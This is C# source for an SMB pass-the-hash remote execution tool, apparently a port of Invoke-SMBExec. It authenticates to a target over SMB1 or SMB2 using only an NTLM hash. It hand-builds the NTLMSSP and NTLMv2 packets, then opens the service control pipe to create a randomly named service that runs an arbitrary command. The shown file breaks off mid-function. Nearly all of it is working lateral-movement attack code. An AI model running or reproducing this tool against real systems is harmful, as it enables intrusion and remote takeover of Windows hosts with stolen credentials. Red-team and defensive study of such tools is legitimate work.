using System;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Collections;
using PowerArgs;

namespace SharpInvoke_SMBExec
{
    public class SMBExecArgs
    {
        [HelpHook, ArgShortcut("-?")]
        public bool Help { get; set; }

        [ArgShortcut("-u"), ArgDescription("Username to use for authentication"), ArgRequired()]
        public string Username { get; set; }

        [ArgShortcut("-h"), ArgDescription("NTLM Password hash for authentication. This module will accept either LM:NTLM or NTLM format"), ArgRequired()]
        public string Hash { get; set; }

        [ArgShortcut("-d"), ArgDescription("Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username")]
        public string Domain { get; set; }

        [ArgShortcut("-t"),ArgDescription("Hostname or IP Address of the target.")]
        public string Target { get; set; }

        [ArgShortcut("-c"), ArgDescription("Command to execute on the target. If a command is not specified, the function will check to see if the username and hash provide local admin access on the target")]
        public string Command { get; set; }

        [ArgShortcut("-s"),ArgDescription("Default = 20 Character Random. The Name of the service to create and delete on the target.")]
        public string Service { get; set; }

        [ArgShortcut("-cc"),ArgDescription("Default = Disabled: Prepend %COMSPEC% /C to Command"),ArgDefaultValue(false)]
        public bool ComSpec { get; set; }

        [ArgShortcut("-v1"), ArgDescription ("Force SMB1. The default behavior is to perform SMB Version negotiation and use SMB2 if it's supported by the target"), ArgDefaultValue(false)]
        public bool SMB1 { get; set; }

        [ArgShortcut("-st"),ArgDescription("Time in seconds to sleep. Change this value if you're getting weird results."), ArgDefaultValue(15)]
        public int Sleep { get; set; }

        [ArgShortcut("-dbg"),ArgDescription("Switch, Enabled debugging"), ArgDefaultValue(false)]
        public bool Debug { get; set; }
    }
    class Program
    {
        static void Main(string[] args)
        {
            SMBExecArgs parsed = null;
            try
            {
                parsed = Args.Parse<SMBExecArgs>(args);
            }
            catch (MissingArgException e)
            {
                Console.WriteLine("Missing Required Parameter!");
                Environment.Exit(0);
            }


            if (parsed == null)
            {
                Environment.Exit(0);
            }

            //User Set
            string target = parsed.Target;
            string username = parsed.Username;
            string domain = parsed.Domain;
            string command = parsed.Command;
            string SMB_version = "";
            string hash = parsed.Hash;
            string service = parsed.Service;
            bool SMB1 = parsed.SMB1;
            bool commandCOMSPEC = parsed.ComSpec;
            bool show_help=parsed.Help;
            int sleep = parsed.Sleep;
            bool debugging = parsed.Debug;

            //Trackers

            bool login_successful = false;
            bool SMBExec_failed = false;
            bool SMB_execute = false;            
            bool SMB_signing = false;
            string output_username;
            string processID;            
            int SMB2_message_ID = 0;           
            int SMB_close_service_handle_stage = 0;
            int SMB_split_stage=0;
            int SMB_split_index_tracker = 0;
            double SMB_split_stage_final =0; 
            
                                   
            //Communication
            byte[] SMBClientReceive = null;

            //Packet Reqs
            byte[] SMB_session_ID = null;
            byte[] session_key = null;
            byte[] SMB_session_key_length = null;
            byte[] SMB_negotiate_flags = null;
            byte[] SMB2_tree_ID = null;
            byte[] SMB_client_send = null;
            byte[] SMB_FID = new byte[2];
            byte[] SMB_service_manager_context_handle = null;
            byte[] SCM_data = null;
            byte[] SMB_service_context_handle = null;
            byte[] SMB_named_pipe_bytes = null;
            byte[] SMB_file_ID = null;
            byte[] SMB_user_ID = null;
            OrderedDictionary packet_SMB_header = null;
            OrderedDictionary packet_SMB2_header = null;


            if (show_help)
            {
                //Check for help flag, if it's there run help and exit.
                displayHelp(null);
                return;
            }
            else if(string.IsNullOrEmpty(username) || string.IsNullOrEmpty(hash) || string.IsNullOrEmpty(target))
            {
                displayHelp("Missing Required Option!");
                Environment.Exit(0);
            }

            if (!string.IsNullOrEmpty(command))
            {
                SMB_execute = true;
            }

            if (SMB1)
            {
                if (debugging == true) { Console.WriteLine("SMB Version Set to 1"); }
                SMB_version = "SMB1";
            }

            //Check if the hash matches the correct format we need it in.
            if (!string.IsNullOrEmpty(hash))
            {
                if (debugging == true) { Console.WriteLine("Checking Hash Value \nCurrent Hash: {0}", hash); }
                if (hash.Contains(":"))
                {
                    hash = hash.Split(':').Last();
                }
            }

            //Check to see if domain is empty, if it's not update the username, if it is just keep the username
            if (!string.IsNullOrEmpty(domain))
            {
                output_username = domain + '\\' + username;
            }
            else
            {
                output_username = username;
            }
            processID = Process.GetCurrentProcess().Id.ToString();
            byte[] process_ID_Bytes = BitConverter.GetBytes(int.Parse(processID));
            processID = BitConverter.ToString(process_ID_Bytes);
            processID = processID.Replace("-00-00", "").Replace("-","");
            process_ID_Bytes = StringToByteArray(processID);
            TcpClient SMBClient = new TcpClient();
            SMBClient.Client.ReceiveTimeout = 60000;
            if (debugging == true) { Console.WriteLine("Attempting to establish connection to {0}", target); }
            try
            {
                SMBClient.Connect(target, 445);
            }
            catch(Exception e)
            {
                if (debugging == true) { Console.WriteLine("Error connecting to target: {0}", e.Message); }
                else { Console.WriteLine("Could not connect to " + target); }
            }

            if (SMBClient.Connected)
            {
                if (debugging == true) { Console.WriteLine("Successfully Connected to {0}", target); }
                NetworkStream SMBClientStream = SMBClient.GetStream();
                SMBClientReceive = new byte[1024]; //Line 851

                //Keeps track of where we are in packet communications.

                string SMBClientStage = "NegotiateSMB";

                while (SMBClientStage != "exit")
                {
                    switch (SMBClientStage)
                    {
                        case "NegotiateSMB":
                            { //Script block required for packet_NetBIOS_session_service variable scoping. Otherwise when it's declared I can't re-declare it in other blocks.
                                packet_SMB_header = new OrderedDictionary();
                                packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x72 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 }); //Line 862, Function on 
                                OrderedDictionary packet_SMB_data = GetPacketSMBNegotiateProtocolRequest(SMB_version);
                                byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                SMB_client_send = new byte[NetBIOS_session_service.Length + SMB_header.Length + SMB_data.Length];
                                Buffer.BlockCopy(NetBIOS_session_service, 0, SMB_client_send, 0, NetBIOS_session_service.Length);
                                Buffer.BlockCopy(SMB_header, 0, SMB_client_send, NetBIOS_session_service.Length, SMB_header.Length);
                                Buffer.BlockCopy(SMB_data, 0, SMB_client_send, NetBIOS_session_service.Length + SMB_header.Length, SMB_data.Length);
                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                SMBClientStream.Flush();
                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                if (debugging == true) { Console.WriteLine("Checking if SMBClientReceive matches 'fe-53-4d-42'"); }
                                if (debugging == true) { Console.WriteLine(BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] })); }
                                if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                {
                                    if (debugging == true) { Console.WriteLine("It does...attempting to negotiate NTLMSSP"); }
                                    SMB_version = "SMB1";
                                    SMBClientStage = "NTLMSSPNegotiate";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                    {
                                        Console.WriteLine("SMB Signing is enabled");
                                        SMB_signing = true;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };

                                    }
                                    else
                                    {
                                        SMB_signing = false;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };

                                    }
                                }
                                else
                                {
                                    SMBClientStage = "NegotiateSMB2";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                    {
                                        Console.WriteLine("SMB Signing is enabled");
                                        SMB_signing = true;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                    }
                                    else
                                    {
                                        if (debugging == true) { Console.WriteLine("SMB Signing is not enabled...continuing"); }
                                        SMB_signing = false;
                                        SMB_session_key_length = new byte[] { 0x00, 0x00 };
                                        SMB_negotiate_flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };

                                    }
                                }
                                if (debugging == true) { Console.WriteLine("Moving to new ClientStage: " + SMBClientStage); }
                            }
                            break;
                        case "NegotiateSMB2":
                            {
                                packet_SMB2_header = new OrderedDictionary();
                                SMB2_tree_ID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                                SMB_session_ID = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                SMB2_message_ID = 1;
                                packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x00, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                OrderedDictionary packet_SMB2_data = GetPacketSMB2NegotiateProtocolRequest();
                                byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                SMBClientStream.Flush();
                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                SMBClientStage = "NTLMSSPNegotiate";

                            }
                            break;
                        case "NTLMSSPNegotiate":
                            {
                                SMB_client_send = null;
                                if (SMB_version == "SMB1")
                                {
                                    packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, new byte[] { 0x00, 0x00 });

                                    if (SMB_signing)
                                    {
                                        packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                    }
                                    OrderedDictionary packet_NTLMSSP_negotiate = GetPacketNTLMSSPNegotiate(SMB_negotiate_flags, null);
                                    byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                    byte[] NTLMSSP_negotiate = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                                    OrderedDictionary packet_SMB_data = GetPacketSMBSessionSetupAndXRequest(NTLMSSP_negotiate);
                                    byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                    OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                    byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                    SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                                    SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);
                                }
                                else
                                {
                                    packet_SMB2_header = new OrderedDictionary();
                                    SMB2_message_ID += 1;
                                    packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x01, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                    OrderedDictionary packet_NTLMSSP_negotiate = GetPacketNTLMSSPNegotiate(SMB_negotiate_flags, null); //need to see if packet_version works? Maybe this is just left over?
                                    byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                    byte[] NTLMSSP_negotiate = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                                    OrderedDictionary packet_SMB2_data = GetPacketSMB2SessionSetupRequest(NTLMSSP_negotiate);
                                    byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                    OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                    byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                    SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                    SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                
                                }
                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                SMBClientStream.Flush();
                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                SMBClientStage = "exit";
                            }
                            break;

                    }
                }
                //Begin Authentication
                string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
                int SMB_NTLMSSP_bytes_index = SMB_NTLMSSP_Index / 2;
                int SMB_domain_length = DataLength2(SMB_NTLMSSP_bytes_index + 12, SMBClientReceive);
                int SMB_target_length = DataLength2(SMB_NTLMSSP_bytes_index + 40, SMBClientReceive);
                SMB_session_ID = getByteRange(SMBClientReceive, 44,51);
                byte[] SMB_NTLM_challenge = getByteRange(SMBClientReceive, SMB_NTLMSSP_bytes_index + 24, SMB_NTLMSSP_bytes_index + 31);
                byte[] SMB_target_details = null;
                SMB_target_details = getByteRange(SMBClientReceive, (SMB_NTLMSSP_bytes_index + 56 + SMB_domain_length), (SMB_NTLMSSP_bytes_index + 55 + SMB_domain_length + SMB_target_length));
                byte[] SMB_target_time_bytes = getByteRange(SMB_target_details, SMB_target_details.Length - 12, SMB_target_details.Length - 5);
                string hash2 = "";
                for (int i = 0; i < hash.Length-1; i+=2) { hash2 += (hash.Substring(i,2) + "-"); };
                byte[] NTLM_hash_bytes = (StringToByteArray(hash.Replace("-", "")));
                string[] hash_string_array = hash2.Split('-');
                string auth_hostname = Environment.MachineName;
                byte[] auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname);
                byte[] auth_domain_bytes = Encoding.Unicode.GetBytes(domain);
                byte[] auth_username_bytes = Encoding.Unicode.GetBytes(username);
                byte[] auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length);
                auth_domain_length = new byte[] { auth_domain_length[0], auth_domain_length[1] };
                byte[] auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length);
                auth_username_length = new byte[] { auth_username_length[0], auth_username_length[1] };
                byte[] auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length);
                auth_hostname_length = new byte[] { auth_hostname_length[0], auth_hostname_length[1] };
                byte[] auth_domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                byte[] auth_username_offset = BitConverter.GetBytes(auth_domain_bytes.Length + 64);
                byte[] auth_hostname_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + 64);
                byte[] auth_LM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 64);
                byte[] auth_NTLM_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + 88);
                HMACMD5 HMAC_MD5 = new HMACMD5();
                HMAC_MD5.Key = NTLM_hash_bytes;
                string username_and_target = username.ToUpper();
                byte[] username_bytes = Encoding.Unicode.GetBytes(username_and_target);
                byte[] username_and_target_bytes = null;
                username_and_target_bytes = CombineByteArray(username_bytes, auth_domain_bytes);
                byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes);
                Random r = new Random();
                byte[] client_challenge_bytes = new byte[8];
                r.NextBytes(client_challenge_bytes);



                byte[] security_blob_bytes = null;
                    security_blob_bytes = CombineByteArray(new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, SMB_target_time_bytes);
                    security_blob_bytes = CombineByteArray(security_blob_bytes, client_challenge_bytes);
                    security_blob_bytes = CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                    security_blob_bytes = CombineByteArray(security_blob_bytes, SMB_target_details);
                    security_blob_bytes = CombineByteArray(security_blob_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

                byte[] server_challenge_and_security_blob_bytes = CombineByteArray(SMB_NTLM_challenge, security_blob_bytes);
                HMAC_MD5.Key = NTLMv2_hash;
                byte[] NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes);
                    if (SMB_signing)
                    {
                        byte[] session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response);
                        session_key = session_base_key;
                        HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                        HMAC_SHA256.Key = session_key;
                    }

                    NTLMv2_response = CombineByteArray(NTLMv2_response, security_blob_bytes);
                byte[] NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length);
                    NTLMv2_response_length = new byte[]{ NTLMv2_response_length[0], NTLMv2_response_length[1] };
                byte[] SMB_session_key_offset = BitConverter.GetBytes(auth_domain_bytes.Length + auth_username_bytes.Length + auth_hostname_bytes.Length + NTLMv2_response.Length + 88);
                    byte[] NTLMSSP_response = null;
                    NTLMSSP_response = CombineByteArray(new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 }, auth_LM_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_NTLM_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, SMB_session_key_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, SMB_session_key_length);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, SMB_session_key_offset);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, SMB_negotiate_flags);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_bytes);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_bytes);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_bytes);
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
                    NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response);


                    if (SMB_version == "SMB1")
                    {
                        if (debugging) { Console.WriteLine("Version is SMB1"); }
                        packet_SMB_header = new OrderedDictionary();
                        SMB_user_ID = new byte[] { SMBClientReceive[32], SMBClientReceive[33] };
                        packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, SMB_user_ID);

                        if (SMB_signing)
                        {
                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                        }

                        packet_SMB_header["SMBHeader_UserID"] = SMB_user_ID;
                        OrderedDictionary packet_NTLMSSP_negotiate = GetPacketNTLMSSPAuth(NTLMSSP_response);
                        byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                        byte[] NTLMSSP_negotiate = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_negotiate);
                        OrderedDictionary packet_SMB_data = GetPacketSMBSessionSetupAndXRequest(NTLMSSP_negotiate);
                        byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                        OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                        byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                        SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB_header);
                        SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);

                    }
                    else
                    {
                        if (debugging) { Console.WriteLine("Version is SMB2"); }
                        SMB2_message_ID += 1;
                        packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x01, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                        OrderedDictionary packet_NTLMSSP_auth = GetPacketNTLMSSPAuth(NTLMSSP_response);
                        byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                        byte[] NTLMSSP_auth = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_auth);
                        OrderedDictionary packet_SMB2_data = GetPacketSMB2SessionSetupRequest(NTLMSSP_auth);
                        byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                        OrderedDictionary packet_NetBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                        byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                        SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                        SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                    }



                    SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                    SMBClientStream.Flush();
                    SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                    if (SMB_version == "SMB1")
                    {
                        if (BitConverter.ToString(getByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                        {
                            Console.WriteLine("Successfully authenticated to the target");
                            login_successful = true;
                        }
                        else
                        {
                        //The Powershell script is also failing on authentication. It might be an issue with my Machine.
                            Console.WriteLine("Unable to authenticate to the target");
                            login_successful = false;
                        }
                    }
                    else
                    {
                        if (BitConverter.ToString(getByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                        {
                            Console.WriteLine("Successfully authenticated to the target");
                            login_successful = true;
                        }
                        else
                        {
                        Console.WriteLine("Unable to authenticate to the target");;
                        login_successful = false;
                        }
                    }


                    if (login_successful)
                    {
                        byte[] SMBExec_command;
                        byte[] SMB_path_bytes;
                        string SMB_Path = "\\\\" + target + "\\IPC$";
                        if (SMB_version == "SMB1")
                        {
                            SMB_path_bytes = CombineByteArray(Encoding.UTF8.GetBytes(SMB_Path), new byte[] { 0x00 });
                        }
                        else
                        {
                            SMB_path_bytes = Encoding.Unicode.GetBytes(SMB_Path);
                        }
 
                        byte[] SMB_named_pipe_UUID = { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 };
                        byte[] SMB_service_bytes;
                        string SMB_service = null;
                        if (string.IsNullOrEmpty(service))
                        {
                            //Generate 20 char random string 
                            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                            var rand = new Random();
                            SMB_service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
                            SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service);
                            SMB_service_bytes = CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                        }
                        else
                        {
                            SMB_service = service;
                            SMB_service_bytes = Encoding.Unicode.GetBytes(SMB_service);
                            if (Convert.ToBoolean(SMB_service.Length % 2))
                            {
                                SMB_service_bytes = CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00 });
                            }
                            else
                            {
                                SMB_service_bytes = CombineByteArray(SMB_service_bytes, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                            }
                        }

                    byte[] SMB_service_length = BitConverter.GetBytes(SMB_service.Length + 1);

                        if (commandCOMSPEC)
                        {
                            command = "%COMSPEC% /C \"" + command + "\"";
                        }
                        else
                        {
                            command = "\"" + command + "\"";
                        }

                        byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                        List<byte> SMBExec_command_list = new List<byte>();
                        foreach (byte commandByte in commandBytes)
                        {
                            SMBExec_command_list.Add(commandByte);
                            SMBExec_command_list.Add(0x00);

                        }
                        byte[] SMBExec_command_init = SMBExec_command_list.ToArray();

                        /**
                        List<char> NTLM_char_list = new List<char>();
                        string[] NTLM_Hash_Array = NTLM_hash_split.ToString().Split('-');
                        foreach(string foo in NTLM_Hash_Array) { Convert.ToInt16(foo); };
                        **/
                        if(Convert.ToBoolean(command.Length % 2))
                        {
                            SMBExec_command = CombineByteArray(SMBExec_command_init, new byte[] { 0x00, 0x00 });
                        }
                        else
                        {
                            SMBExec_command = CombineByteArray(SMBExec_command_init, new byte[] { 0x00, 0x00, 0x00, 0x00 });
                        }
                        byte[] SMBExec_command_length_bytes = BitConverter.GetBytes(SMBExec_command.Length / 2); //PS Script converts ToInt16, do I need to do this? I never changed it to a string, so I think it should be fine?
                                                                                                                 //$SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
                        int SMB_split_index = 4256;
                        int SMB_signing_counter=0;
                        byte[] SMB_tree_ID = new byte[2];
                        string SMB_client_stage_next="";

                        if (SMB_version == "SMB1")
                        {
                            SMBClientStage = "TreeConnectAndXRequest";
                            while (SMBClientStage != "exit" && SMBExec_failed == false)
                            {
                                switch (SMBClientStage)
                                {
                                    case "TreeConnectAndXRequest":
                                        {
                                            packet_SMB_header = new OrderedDictionary();
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0x75 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter = 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBTreeConnectAndXRequest(SMB_path_bytes);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_Session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_Session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = CombineByteArray(session_key, SMB_header);
                                                byte[] SMB_Sign2 = CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign2);
                                                byte[] SMB_Signature2 = getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature2;
                                                SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_Session_service, SMB_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB_data);


                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "CreateAndXRequest";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "CreateAndXRequest":
                                        {
                                            SMB_named_pipe_bytes = new byte[] { 0x5c, 0x73, 0x76, 0x63, 0x63, 0x74, 0x6c, 0x00 }; //svcctl
                                            SMB_tree_ID = getByteRange(SMBClientReceive, 28, 29);
                                            packet_SMB_header = GetPacketSMBHeader(new byte[] { 0xa2 }, new byte[] { 0x18 }, new byte[] { 0x02, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);
                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = GetPacketSMBNTCreateAndXRequest(SMB_named_pipe_bytes);
                                            byte[] SMB_data = ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_Session_service = GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_Session_service = ConvertFromPacketOrderedDictionary(packet_NetBIOS_Session_service);

                                            if (SMB_signing)
                                            {
